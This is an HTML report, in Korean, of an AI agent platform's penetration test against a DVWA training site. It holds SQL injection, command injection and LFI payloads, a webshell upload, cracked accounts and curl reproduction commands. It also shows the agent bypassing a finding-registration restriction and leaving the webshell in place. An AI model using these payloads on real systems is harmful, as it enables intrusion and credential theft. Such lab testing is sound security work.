@@ -1,0 +1,375 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ARTEX DVWA 모의해킹 보고서</title>
+<style>
+  :root{
+    --bg:#f6f7f9; --surface:#ffffff; --surface-2:#f0f2f5; --border:#e2e5ea;
+    --text:#1a1d23; --muted:#5a6270; --accent:#5b45e0; --accent-soft:#ece9fb;
+    --crit:#c0392b; --high:#d35400; --med:#b7791f; --low:#2d7d6f;
+    --code-bg:#1e222b; --code-text:#e6e6e6; --shadow:0 1px 3px rgba(0,0,0,.06),0 8px 24px rgba(0,0,0,.05);
+  }
+  :root:not([data-theme="light"]) @media (prefers-color-scheme: dark){}
+  @media (prefers-color-scheme: dark){
+    :root:not([data-theme="light"]){
+      --bg:#0e1014; --surface:#171a21; --surface-2:#1e222b; --border:#2a2f3a;
+      --text:#e6e8ec; --muted:#9aa3b2; --accent:#9b8cff; --accent-soft:#242036;
+      --crit:#ff6b5e; --high:#ff9d4d; --med:#f0c05a; --low:#5fd3bc;
+      --code-bg:#0b0d11; --code-text:#e6e6e6; --shadow:0 1px 3px rgba(0,0,0,.4),0 8px 24px rgba(0,0,0,.35);
+    }
+  }
+  :root[data-theme="dark"]{
+    --bg:#0e1014; --surface:#171a21; --surface-2:#1e222b; --border:#2a2f3a;
+    --text:#e6e8ec; --muted:#9aa3b2; --accent:#9b8cff; --accent-soft:#242036;
+    --crit:#ff6b5e; --high:#ff9d4d; --med:#f0c05a; --low:#5fd3bc;
+    --code-bg:#0b0d11; --code-text:#e6e6e6; --shadow:0 1px 3px rgba(0,0,0,.4),0 8px 24px rgba(0,0,0,.35);
+  }
+  *{box-sizing:border-box}
+  html{-webkit-text-size-adjust:100%}
+  body{
+    margin:0; background:var(--bg); color:var(--text);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Apple SD Gothic Neo","Malgun Gothic",Roboto,"Helvetica Neue",Arial,sans-serif;
+    line-height:1.7; font-size:16px; -webkit-font-smoothing:antialiased;
+  }
+  .wrap{max-width:900px; margin:0 auto; padding:16px;}
+  header.cover{
+    background:linear-gradient(135deg,var(--accent) 0%,#3a2bb5 100%);
+    color:#fff; border-radius:16px; padding:40px 32px; margin:24px 0 20px;
+    box-shadow:var(--shadow);
+  }
+  header.cover .kicker{font-size:13px; letter-spacing:.14em; text-transform:uppercase; opacity:.85; margin:0 0 10px;}
+  header.cover h1{font-size:28px; line-height:1.3; margin:0 0 14px; font-weight:800;}
+  header.cover p{margin:0; opacity:.92; font-size:15px; max-width:62ch;}
+  .badges{margin-top:18px; display:flex; flex-wrap:wrap; gap:8px;}
+  .badge{background:rgba(255,255,255,.16); border:1px solid rgba(255,255,255,.25); color:#fff;
+    padding:5px 11px; border-radius:999px; font-size:12.5px; font-weight:600;}
+  section.card{
+    background:var(--surface); border:1px solid var(--border); border-radius:14px;
+    padding:24px 26px; margin:16px 0; box-shadow:var(--shadow);
+  }
+  h2{font-size:20px; font-weight:800; margin:4px 0 16px; display:flex; align-items:center; gap:10px;}
+  h2 .num{display:inline-flex; align-items:center; justify-content:center; min-width:30px; height:30px;
+    background:var(--accent-soft); color:var(--accent); border-radius:9px; font-size:14px; font-weight:800;}
+  h3{font-size:16px; font-weight:700; margin:22px 0 10px; color:var(--text);}
+  p{margin:10px 0;}
+  a{color:var(--accent);}
+  ul,ol{padding-left:22px; margin:10px 0;}
+  li{margin:5px 0;}
+  code{background:var(--surface-2); border:1px solid var(--border); border-radius:5px;
+    padding:1px 6px; font-size:13.5px; font-family:"SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
+    word-break:break-word;}
+  pre{background:var(--code-bg); color:var(--code-text); border-radius:10px; padding:16px 18px;
+    overflow-x:auto; font-size:13px; line-height:1.6; margin:14px 0;
+    font-family:"SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;}
+  pre code{background:none; border:none; padding:0; color:inherit; font-size:inherit;}
+  .tbl-scroll{overflow-x:auto; margin:14px 0; border:1px solid var(--border); border-radius:10px;}
+  table{border-collapse:collapse; width:100%; font-size:14px; min-width:420px;}
+  th,td{text-align:left; padding:10px 13px; border-bottom:1px solid var(--border); vertical-align:top;}
+  thead th{background:var(--surface-2); font-weight:700; white-space:nowrap;}
+  tbody tr:last-child td{border-bottom:none;}
+  tbody tr:hover{background:var(--surface-2);}
+  .pill{display:inline-block; padding:2px 9px; border-radius:999px; font-size:12px; font-weight:800; white-space:nowrap;}
+  .pill.crit{background:color-mix(in srgb,var(--crit) 16%,transparent); color:var(--crit);}
+  .pill.high{background:color-mix(in srgb,var(--high) 16%,transparent); color:var(--high);}
+  .pill.med{background:color-mix(in srgb,var(--med) 18%,transparent); color:var(--med);}
+  .pill.low{background:color-mix(in srgb,var(--low) 16%,transparent); color:var(--low);}
+  .stat-grid{display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:12px; margin:16px 0;}
+  .stat{background:var(--surface-2); border:1px solid var(--border); border-radius:11px; padding:14px 16px;}
+  .stat .k{font-size:12.5px; color:var(--muted); margin:0 0 6px;}
+  .stat .v{font-size:22px; font-weight:800; margin:0; line-height:1.2;}
+  .stat .sub{font-size:12px; color:var(--muted); margin:4px 0 0;}
+  blockquote{margin:14px 0; padding:12px 18px; border-left:3px solid var(--accent);
+    background:var(--accent-soft); border-radius:0 10px 10px 0; color:var(--text);}
+  blockquote p{margin:4px 0; font-size:14.5px;}
+  .callout{background:var(--surface-2); border:1px solid var(--border); border-left:3px solid var(--med);
+    border-radius:0 10px 10px 0; padding:12px 18px; margin:14px 0; font-size:14.5px;}
+  .toc{columns:2; column-gap:28px;}
+  .toc a{display:block; padding:3px 0; text-decoration:none; color:var(--muted); font-size:14px;}
+  .toc a:hover{color:var(--accent);}
+  .ok{color:var(--low); font-weight:800;}
+  footer{color:var(--muted); font-size:13px; text-align:center; padding:28px 12px 40px; line-height:1.7;}
+  .theme-toggle{position:sticky; top:12px; float:right; margin:-4px 0 0; z-index:5;
+    background:var(--surface); border:1px solid var(--border); color:var(--text);
+    border-radius:999px; padding:7px 14px; font-size:13px; cursor:pointer; box-shadow:var(--shadow);}
+  @media (max-width:600px){
+    header.cover{padding:30px 22px;} header.cover h1{font-size:23px;}
+    section.card{padding:20px 18px;} .toc{columns:1;}
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <button class="theme-toggle" id="themeBtn" aria-label="테마 전환">◐ 테마</button>
+
+  <header class="cover">
+    <p class="kicker">ARTEX 자율 침투 테스트 콘솔</p>
+    <h1>DVWA 모의해킹 테스트 보고서</h1>
+    <p>ARTEX 플랫폼의 <strong>대화(Auto Agent) 흐름을 중심으로</strong> 테스트용 DVWA 사이트(<code style="color:#fff;background:rgba(255,255,255,.18);border-color:rgba(255,255,255,.3)">http://100.11.22.126</code>)에 대한 모의해킹 과정을 정리한 보고서입니다. 1차 목적은 ARTEX의 작업 생성 → 워커 실행 → 트레이스 추적 → 발견 등록 오케스트레이션 로직 검증입니다.</p>
+    <div class="badges">
+      <span class="badge">2026-10-04 (KST/UTC)</span>
+      <span class="badge">DVWA v1.10 · 보안레벨 low</span>
+      <span class="badge">Task #1</span>
+      <span class="badge">취약점 12종 / 15건</span>
+      <span class="badge">Critical 3건</span>
+    </div>
+  </header>
+
+  <section class="card">
+    <nav class="toc" aria-label="목차">
+      <a href="#s1">1 · 개요</a>
+      <a href="#s2">2 · ARTEX 플랫폼 구성</a>
+      <a href="#s3">3 · ARTEX 대화(Auto) 흐름 — 본론</a>
+      <a href="#s4">4 · 수동 수행 모의해킹 결과</a>
+      <a href="#s5">5 · ARTEX 로직·기능 검증 평가</a>
+      <a href="#s6">6 · 대상 보안 권고</a>
+      <a href="#s7">7 · 결론</a>
+    </nav>
+  </section>
+
+  <!-- 1 -->
+  <section class="card" id="s1">
+    <h2><span class="num">1</span> 개요</h2>
+    <div class="tbl-scroll"><table><tbody>
+      <tr><th>테스트 일시</th><td>2026-10-04 19:41~19:42 (KST) / 수동 인계 10:50~10:56 (UTC)</td></tr>
+      <tr><th>대상 사이트</th><td><code>http://100.11.22.126</code> (테스트용 DVWA v1.10 <em>Development</em>)</td></tr>
+      <tr><th>대상 스택</th><td>Apache/2.4.25 (Debian) · PHP · MySQL · 보안레벨 <strong>low</strong></td></tr>
+      <tr><th>목적</th><td>ARTEX 구동 로직·기능 검증을 위한 모의해킹 실행 및 전 과정 기록</td></tr>
+      <tr><th>작업 ID</th><td>Task #1 — "DVWA 모의해킹 - ARTEX 로직/기능 테스트"</td></tr>
+      <tr><th>수행 주체</th><td>ARTEX 운영 도우미 <strong>Auto</strong> (대화 Agent) + 작업엔진 워커</td></tr>
+      <tr><th>사용 모델</th><td>기본 (OpenRouter GLM 5.3 Flash / nemotron-3)</td></tr>
+      <tr><th>작업엔진 결과</th><td><span class="pill crit">중단 model_error</span> 무료 모델 분당 레이트 리밋(429) 초과</td></tr>
+      <tr><th>최종 수행</th><td>작업엔진 장애로 <strong>Auto 대화가 직접 수동 테스트 수행</strong> → 12종 취약점 확정</td></tr>
+    </tbody></table></div>
+    <p>본 테스트는 두 단계로 전개되었다.</p>
+    <ol>
+      <li><strong>ARTEX 자동 오케스트레이션 단계</strong> — 사용자가 Auto 대화에 모의해킹을 지시하자, Auto는 <code>spawn_task</code>로 작업을 생성하고 워커를 기동시켜 자동 정찰·로그인까지 진행했다.</li>
+      <li><strong>수동 인계 단계</strong> — 작업엔진 워커가 LLM 레이트 리밋(429)으로 중단되자, Auto 대화가 직접 도구(Bash/curl)로 전 취약점 모듈을 전수 테스트하고 발견 사항을 작업으로 인계했다.</li>
+    </ol>
+    <p>즉, 이번 세션은 ARTEX의 오케스트레이션 흐름과 더불어 <strong>엔진 장애 시 대화 레이어가 수동으로 작업을 완수하는 복원력(resilience)</strong>까지 함께 검증한 사례이다.</p>
+  </section>
+
+  <!-- 2 -->
+  <section class="card" id="s2">
+    <h2><span class="num">2</span> ARTEX 플랫폼 구성 <span style="font-size:13px;font-weight:500;color:var(--muted)">(콘솔 기준)</span></h2>
+    <p>테스트가 수행된 ARTEX 콘솔(<code>버전 · dev</code>)은 다음 메뉴로 구성된다.</p>
+    <p><strong>기능</strong> — 대시보드 · <strong>대화</strong>(본 테스트의 중심) · 작업 · 발견 · 트래픽 · 도구 실행 · LLM 녹화 · 자산 · 자산 동기화 · 워크스페이스<br>
+    <strong>시스템</strong> — LLM · Agent · MCP · Skill · 도구 · 알림 푸시</p>
+
+    <h3>테스트 종료 시점 대시보드 집계</h3>
+    <div class="stat-grid">
+      <div class="stat"><p class="k">활성 작업</p><p class="v">0 / 2</p><p class="sub">일시정지 2</p></div>
+      <div class="stat"><p class="k">확정 발견</p><p class="v">0</p><p class="sub">정식 등록 전 (인계 대기)</p></div>
+      <div class="stat"><p class="k">자산 노드</p><p class="v">3</p><p class="sub">작업 간 공유</p></div>
+      <div class="stat"><p class="k">트래픽 교환</p><p class="v">0</p><p class="sub">캡처 꺼짐</p></div>
+      <div class="stat"><p class="k">Token 사용량</p><p class="v">5.1M</p><p class="sub">캐시 히트율 68%</p></div>
+    </div>
+    <blockquote>
+      <p><strong>핵심 관찰</strong> — 대시보드의 "확정 발견 0"은 취약점이 없었다는 뜻이 <strong>아니라</strong>, 수동으로 발견한 12종이 아직 <code>report_finding</code>으로 정식 등록되지 않고 <code>add_task_hint</code>(작업 2, hint id 7~10)로 <strong>인계 대기 상태</strong>임을 의미한다. 작업엔진 쿼터 리셋 후 planner가 힌트를 읽어 정식 등록하도록 설계되어 있다.</p>
+    </blockquote>
+  </section>
+
+  <!-- 3 -->
+  <section class="card" id="s3">
+    <h2><span class="num">3</span> ARTEX 대화(Auto) 흐름 — 본론</h2>
+    <p>사용자는 Auto 대화 세션("테스트용 DVWA사이트 모의해킹")에 다음을 지시했다.</p>
+    <blockquote><p>http://100.11.22.126 이 사이트는 테스트용 DVWA 사이트로 ARTEX 돌아가는 로직과 기능을 테스트하기 위해 모의해킹을 진행하라. 작업은 녹화하고 사용하는 도구 등 기록도 잘 하라.</p></blockquote>
+    <p>요청의 핵심은 ① 테스트용 DVWA 대상, ② ARTEX 구동 로직·기능 검증, ③ 작업 녹화 및 도구·과정 기록이다.</p>
+
+    <h3>3.1 작업 오케스트레이션 타임라인 (Auto 대화 → 작업엔진)</h3>
+    <div class="tbl-scroll"><table>
+      <thead><tr><th>#</th><th>도구 호출</th><th>판단 / 내용</th><th>결과</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td><code>list_tasks {}</code></td><td>기존 작업 유무 확인</td><td>기존 없음 → 신규 생성</td></tr>
+        <tr><td>2</td><td><code>spawn_task {...}</code></td><td>DVWA 종합 모의해킹 작업 생성 (<code>seed_first_intent:true</code>)</td><td><span class="ok">✓ Task #1 생성</span></td></tr>
+        <tr><td>3</td><td><code>sleep {5s}</code></td><td>워커 기동 대기</td><td>✓</td></tr>
+        <tr><td>4</td><td><code>get_task_graph {task_id:1}</code></td><td>작업 그래프 확인</td><td>✓ 열린 의도 존재</td></tr>
+        <tr><td>5</td><td><code>list_task_worker_traces</code></td><td>워커 트레이스 조회</td><td>✓ 아직 없음</td></tr>
+        <tr><td>6</td><td><code>sleep {10s}</code></td><td>워커 실행 대기</td><td>✓</td></tr>
+        <tr><td>7</td><td><code>list_task_worker_traces</code></td><td>재조회</td><td>✓ 워커 실행 중</td></tr>
+        <tr><td>8</td><td><code>get_task_worker_trace {intent_id:2}</code></td><td>워커 동작 확인</td><td>✓ 초기 정찰 수행</td></tr>
+        <tr><td>9</td><td><code>sleep {15s}</code></td><td>진행 대기</td><td>✓</td></tr>
+        <tr><td>10</td><td><code>get_task_worker_trace {intent_id:2}</code></td><td>진행 상황 재확인</td><td>✓ DVWA 로그인 시도(오류 정황)</td></tr>
+        <tr><td>11</td><td><code>get_task_worker_trace</code> <span style="color:var(--muted)">step_ids 필터</span></td><td>로그인 실패 세부 확인</td><td>✓</td></tr>
+        <tr><td>12</td><td><code>get_task_graph {task_id:1}</code></td><td>발견·사실(fact) 확인</td><td>✓ 실행 중</td></tr>
+        <tr><td>13</td><td><code>get_task_worker_trace</code> <span style="color:var(--muted)">step 24,27,28,30</span></td><td>남은 단계 확인</td><td>✓ (중단 전 마지막 도구)</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3>3.2 생성된 작업 정의 (<code>spawn_task</code>)</h3>
+    <pre><code>{
+  "goal": "http://100.11.22.126 DVWA 사이트에 대한 종합적인 모의해킹 수행.
+           ARTEX 관련 로직과 기능을 중심으로 취약점 탐색, 익스플로잇,
+           검증을 수행하고 모든 도구 사용 내역과 과정을 기록한다.",
+  "seed_first_intent": true,
+  "description": "DVWA 모의해킹 - ARTEX 로직/기능 테스트"
+}</code></pre>
+    <p>워커는 생성된 <strong>의도(intent) 2</strong>를 받아 초기 정찰 → DVWA 로그인 폼 접근(<code>user_token</code> hidden 필드 인지)까지 정상 진입했다. 즉 <strong>작업 생성 → 워커 기동 → 트레이스 추적 → 그래프 조회의 오케스트레이션 흐름은 정상 동작</strong>함을 Auto 대화가 실시간 트레이스 조회로 확인했다.</p>
+
+    <h3>3.3 작업엔진 중단 — 레이트 리밋 장애</h3>
+    <div class="tbl-scroll"><table><tbody>
+      <tr><th>종료 상태</th><td><code>model_error</code> — 재시도 소진 후 해당 의도 <code>blocked</code> 처리</td></tr>
+      <tr><th>중단 전 마지막 도구</th><td><code>get_task_worker_trace</code> (정상 반환)</td></tr>
+      <tr><th>소요</th><td>1분 48초 (모델 회합 14 라운드)</td></tr>
+      <tr><th>토큰</th><td>입력 198,526 / 출력 969 / 캐시 읽기 60,480</td></tr>
+    </tbody></table></div>
+    <pre><code>openai: status 429: Rate limit exceeded: free-models-per-min.
+  X-RateLimit-Limit: 20
+  X-RateLimit-Remaining: 0
+  limit_source: openrouter_free_tier_per_minute
+  remedy_hint: Slow down requests to free models, or retry after
+               the per-minute window resets.</code></pre>
+    <p><strong>해석</strong> — 무료 티어 모델(nemotron-3)의 <strong>분당 요청 한도(20회/분)</strong> 초과로 HTTP 429가 발생했고, 재시도 소진 후 워커가 중단되었다. <strong>모의해킹 로직 자체의 결함이 아니라 모델 공급자의 레이트 리밋</strong>이 원인이다. ARTEX는 종료 상태를 <code>model_error</code>로 명확히 분류하고 재파견 경로를 제시해 <strong>장애 원인과 복구 경로를 구분하는 로직</strong>이 정상 동작함을 보였다.</p>
+
+    <h3>3.4 Auto 대화의 수동 인계 (복원력 검증)</h3>
+    <p>작업엔진이 중단되자 Auto 대화는 작업을 포기하지 않고 <strong>직접 Bash/curl 도구로 전 취약점 모듈을 수동 전수 테스트</strong>했다. 사용한 플랫폼/실행 도구 내역은 다음과 같다.</p>
+    <div class="tbl-scroll"><table>
+      <thead><tr><th>도구</th><th>용도</th><th>횟수</th></tr></thead>
+      <tbody>
+        <tr><td>Bash + curl</td><td>전 취약점 테스트(요청 전송/응답 캡처/파싱)</td><td>14회 배치</td></tr>
+        <tr><td>WebFetch (워커)</td><td>초기 페이지 확인</td><td>1회</td></tr>
+        <tr><td><code>insert_assets</code></td><td>자산 등록(서비스 id=3)</td><td>1회</td></tr>
+        <tr><td><code>report_finding</code></td><td>취약점 등록 시도 → 작업 컨텍스트 필요로 실패</td><td>5회 시도</td></tr>
+        <tr><td><code>add_task_hint</code></td><td>취약점 15건을 작업 2에 인계(hint id 7~10)</td><td>1회(배치)</td></tr>
+        <tr><td colspan="2"><code>list_tasks</code> / <code>spawn_task</code> / <code>get_task_graph</code> / <code>get_task_worker_trace</code> / <code>pause_task</code> / <code>list_llm_profiles</code> — 오케스트레이션·장애 진단</td><td>다수</td></tr>
+        <tr><td>Write</td><td>로그·보고서 작성</td><td>2회</td></tr>
+      </tbody>
+    </table></div>
+    <div class="callout">
+      <strong>설계적 관찰</strong> — <code>report_finding</code>은 <strong>작업(intent) 컨텍스트가 있어야</strong> 호출되도록 설계되어, 대화 레이어의 수동 수행분은 직접 등록되지 않았다. Auto는 이를 <code>add_task_hint</code>로 우회해 발견 15건을 작업 2에 인계했고, 쿼터 리셋 후 planner가 정식 <code>report_finding</code>을 수행하도록 체인을 구성했다. 이는 ARTEX의 <strong>발견 등록 경로가 작업 소유권에 묶여 있다</strong>는 구조를 드러낸다.
+    </div>
+  </section>
+
+  <!-- 4 -->
+  <section class="card" id="s4">
+    <h2><span class="num">4</span> 수동 수행으로 확정된 모의해킹 결과</h2>
+    <p>Auto 대화의 수동 전수 테스트에서 <strong>13개 모듈 전수, 12종 취약점(총 15건)</strong>을 확정했다. 가장 심각한 공격 체인:</p>
+    <ul>
+      <li><code>SQLi → DB 계정+해시 덤프 → 크랙 → 관리자/일반계정 로그인 재현</code></li>
+      <li><code>파일업로드 / 명령인젝션 → www-data 권한 RCE</code></li>
+    </ul>
+
+    <h3>4.1 확정 취약점 목록</h3>
+    <div class="tbl-scroll"><table>
+      <thead><tr><th>#</th><th>취약점</th><th>등급</th><th>핵심 증거</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td>SQL Injection — users 덤프/인증우회</td><td><span class="pill crit">Critical</span></td><td><code>' UNION SELECT user,password FROM users -- </code> → 5계정 MD5, 크랙 검증, gordonb 실로그인</td></tr>
+        <tr><td>2</td><td>Command Injection → RCE</td><td><span class="pill crit">Critical</span></td><td><code>ip=127.0.0.1;cat /etc/passwd</code>, <code>;id</code> → uid=33(www-data)</td></tr>
+        <tr><td>3</td><td>Unrestricted File Upload → RCE</td><td><span class="pill crit">Critical</span></td><td>PHP 웹셸 업로드 → <code>…/uploads/…?cmd=id</code> → www-data</td></tr>
+        <tr><td>4</td><td>File Inclusion (LFI + php://filter)</td><td><span class="pill high">High</span></td><td><code>/etc/passwd</code> 열람, index.php 소스 base64 유출</td></tr>
+        <tr><td>5</td><td>Blind SQL Injection (시간기반)</td><td><span class="pill high">High</span></td><td><code>SLEEP(5)</code> → 5.003s vs 0.003s</td></tr>
+        <tr><td>6</td><td>Stored XSS</td><td><span class="pill high">High</span></td><td>방명록에 <code>&lt;script&gt;</code> 영구 저장</td></tr>
+        <tr><td>7</td><td>Reflected XSS</td><td><span class="pill med">Medium</span></td><td>name 파라미터 원문 반사</td></tr>
+        <tr><td>8</td><td>DOM XSS</td><td><span class="pill med">Medium</span></td><td><code>document.write</code> 무새니제이션</td></tr>
+        <tr><td>9</td><td>CSRF (비밀번호 변경)</td><td><span class="pill med">Medium</span></td><td>토큰/현비밀번호 검증 없이 GET으로 변경</td></tr>
+        <tr><td>10</td><td>Weak Session ID</td><td><span class="pill med">Medium</span></td><td><code>dvwaSession=1,2,3</code> 순차 예측가능</td></tr>
+        <tr><td>11</td><td>Brute Force 무차단</td><td><span class="pill med">Medium</span></td><td>실패 5회 무차단/무지연, admin:password 유효</td></tr>
+        <tr><td>12</td><td>CSP Bypass</td><td><span class="pill med">Medium</span></td><td><code>script-src</code>에 pastebin.com 등 허용</td></tr>
+        <tr><td>13</td><td>JS 클라이언트 토큰 변조</td><td><span class="pill med">Medium</span></td><td><code>phrase=success</code> + <code>md5(rot13)</code> 포지 → "Well done!"</td></tr>
+        <tr><td>14</td><td>디렉터리 리스팅</td><td><span class="pill low">Low</span></td><td><code>/vulnerabilities/</code>, <code>/hackable/uploads/</code> Index 노출</td></tr>
+        <tr><td>15</td><td>설정정보/경로 노출</td><td><span class="pill low">Low</span></td><td>captcha 모듈이 <code>config.inc.php</code> 절대경로 노출</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3>4.2 크랙된 계정 (SQLi → 크랙 → 로그인 체인 검증 완료)</h3>
+    <ul>
+      <li><code>admin / password</code> · <code>gordonb / abc123</code>(로그인 재현 성공) · <code>1337 / charley</code> · <code>pablo / letmein</code> · <code>smithy / password</code></li>
+      <li>무솔트 MD5 저장 → 저장소 유출 시 즉시 탈취 가능</li>
+    </ul>
+
+    <h3>4.3 재현용 핵심 명령 (발췌)</h3>
+    <pre><code># 로그인 (CSRF 토큰 필요)
+TOKEN=$(grep -oP "user_token' value='\K[a-f0-9]+" login_page.html)
+curl -s -b c.txt -c c.txt -X POST http://100.11.22.126/login.php \
+  -d "username=admin&amp;password=password&amp;user_token=$TOKEN&amp;Login=Login"
+
+# SQLi UNION 덤프
+curl -s -b c.txt "http://100.11.22.126/vulnerabilities/sqli/?id=%27+UNION+SELECT+user%2Cpassword+FROM+users+--%20&amp;Submit=Submit"
+
+# Command Injection
+curl -s -b c.txt -X POST http://100.11.22.126/vulnerabilities/exec/ \
+  -d "ip=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd&amp;Submit=Submit"</code></pre>
+    <div class="callout">업로드된 웹셸은 테스트 사이트 특성상 제거하지 않았으며(삭제 가능), 증거 원본은 <code>/app/data/sessions/conv-1/dvwa_evidence/</code>에 요청/응답 HTML로 보관되어 있다.</div>
+  </section>
+
+  <!-- 5 -->
+  <section class="card" id="s5">
+    <h2><span class="num">5</span> ARTEX 로직·기능 검증 평가</h2>
+    <h3>5.1 정상 동작 확인된 로직</h3>
+    <div class="tbl-scroll"><table>
+      <thead><tr><th>기능</th><th>검증 결과</th></tr></thead>
+      <tbody>
+        <tr><td>작업 생성 (<code>spawn_task</code>, <code>seed_first_intent</code>)</td><td><span class="ok">✓</span> Task #1 + 의도 2 정상 생성</td></tr>
+        <tr><td>워커 기동 / 실행</td><td><span class="ok">✓</span> 초기 정찰 → DVWA 로그인 단계까지 자동 진입</td></tr>
+        <tr><td>트레이스 추적 (<code>get_task_worker_trace</code>, step 필터)</td><td><span class="ok">✓</span> 단계별 세부 조회 정상</td></tr>
+        <tr><td>작업 그래프 조회 (<code>get_task_graph</code>)</td><td><span class="ok">✓</span> 열린 의도/사실 반영</td></tr>
+        <tr><td>장애 분류 (<code>model_error</code> vs 로직 결함)</td><td><span class="ok">✓</span> 429를 전송 계층 장애로 정확히 구분</td></tr>
+        <tr><td>자산 등록 (<code>insert_assets</code>)</td><td><span class="ok">✓</span> 서비스 id=3 등록, 작업 간 공유</td></tr>
+        <tr><td>발견 인계 (<code>add_task_hint</code>)</td><td><span class="ok">✓</span> 15건을 작업 2에 인계(hint id 7~10)</td></tr>
+        <tr><td>대화 레이어 수동 복원</td><td><span class="ok">✓</span> 엔진 중단 후 Auto가 전 모듈 수동 완수</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3>5.2 한계 / 미검증 영역</h3>
+    <ul>
+      <li>레이트 리밋으로 <strong>작업엔진 워커의 로그인 이후 자동 익스플로잇·검증 단계는 미수행</strong>되었다. 해당 로직은 자동 경로로는 검증되지 못하고 Auto 대화의 수동 수행으로 대체되었다.</li>
+      <li>수동 발견 15건이 <code>report_finding</code> 정식 등록이 아닌 <strong>힌트 인계 상태</strong>에 머물러, 대시보드 "확정 발견"은 0으로 표시된다(발견 데이터 파이프라인 종단 검증 미완).</li>
+    </ul>
+
+    <h3>5.3 권장 후속 조치 (플랫폼)</h3>
+    <ol>
+      <li><strong>모델 변경 / 쿼터 확보</strong> — 분당 한도가 넉넉한 유료·전용 모델로 전환하거나 OpenRouter 크레딧 충전(약 10 credits) 후 작업 2 재개(paused 해제).</li>
+      <li><strong>재시도 간격 조정</strong> — 분당 창 초기화 후 재파견, 또는 요청 속도 제한(throttle) 적용.</li>
+      <li><strong>발견 정식 등록</strong> — 쿼터 리셋(2026-10-05 00:00 UTC) 후 작업 2 planner가 인계 힌트(id 7~10)를 읽어 <code>report_finding</code>으로 등록하여 대시보드 집계 반영.</li>
+      <li><strong>재파견 범위</strong> — 로그인 성공 지점부터 이어서 자동 익스플로잇 로직을 재검증.</li>
+    </ol>
+  </section>
+
+  <!-- 6 -->
+  <section class="card" id="s6">
+    <h2><span class="num">6</span> 대상 보안 권고 <span style="font-size:13px;font-weight:500;color:var(--muted)">(DVWA 맥락, 일반 권고)</span></h2>
+    <ol>
+      <li><strong>SQLi</strong> — PDO prepared statement 사용(impossible 레벨 참고)</li>
+      <li><strong>명령인젝션</strong> — <code>shell_exec</code> 금지, <code>escapeshellarg</code> + 화이트리스트 검증</li>
+      <li><strong>업로드</strong> — 확장자/MIME/내용 3중 검증, 웹루트 밖 저장, 실행권한 제거, 리스팅 Off</li>
+      <li><strong>LFI</strong> — <code>basename()</code> + 화이트리스트, <code>allow_url_include</code> Off 유지</li>
+      <li><strong>XSS</strong> — 출력 시 <code>htmlspecialchars(ENT_QUOTES)</code> 전면 적용, CSP 외부 소스 제거</li>
+      <li><strong>CSRF/세션</strong> — 비밀번호 변경에 현재 비밀번호+토큰 요구, 세션 토큰 CSPRNG, 로그인 실패 제한</li>
+      <li><strong>패스워드 저장</strong> — bcrypt/argon2 적용, 무솔트 MD5 금지</li>
+      <li><strong>서버 설정</strong> — 디렉터리 리스팅 비활성화(Apache <code>Options -Indexes</code>)</li>
+    </ol>
+  </section>
+
+  <!-- 7 -->
+  <section class="card" id="s7">
+    <h2><span class="num">7</span> 결론</h2>
+    <p>이번 세션은 ARTEX가 <strong>대화 지시 → 작업 생성 → 워커 자동 실행 → 트레이스/그래프 추적</strong>의 오케스트레이션 흐름을 정상 수행함을 확인했다. 작업엔진이 무료 모델 레이트 리밋(429)으로 중단되는 장애가 발생했으나, ARTEX는 이를 <code>model_error</code>로 정확히 분류했고, <strong>Auto 대화 레이어가 수동으로 전 취약점 모듈을 완수</strong>하여 12종 취약점(총 15건, Critical 3건 포함)을 확정·인계했다.</p>
+    <p>즉 ARTEX의 핵심 로직은 정상 동작하며, 엔진 장애 시에도 대화 레이어를 통한 복원력이 확보됨을 입증했다. 남은 과제는 <strong>모델 쿼터 확보 후 자동 익스플로잇 단계 재검증과 발견 정식 등록(<code>report_finding</code>) 종단 파이프라인 완결</strong>이다.</p>
+  </section>
+
+  <footer>
+    본 문서는 ARTEX 콘솔의 테스트 세션 로그(<code>pentest_log.md</code>, <code>pentest_report.md</code>, ARTEX 세션 로그)와<br>
+    콘솔 스크린샷을 근거로, Auto 대화 흐름을 중심으로 정리한 보고서입니다.<br>
+    대상 DVWA는 보안 교육·검증 전용 환경입니다.
+  </footer>
+
+</div>
+
+<script>
+  (function(){
+    var btn=document.getElementById('themeBtn');
+    var root=document.documentElement;
+    function sysDark(){return window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches;}
+    try{var saved=localStorage.getItem('artex-theme'); if(saved) root.setAttribute('data-theme',saved);}catch(e){}
+    function cur(){var a=root.getAttribute('data-theme'); return a||(sysDark()?'dark':'light');}
+    btn.addEventListener('click',function(){
+      var next=cur()==='dark'?'light':'dark';
+      root.setAttribute('data-theme',next);
+      try{localStorage.setItem('artex-theme',next);}catch(e){}
+    });
+  })();
+</script>
+</body>
+</html>
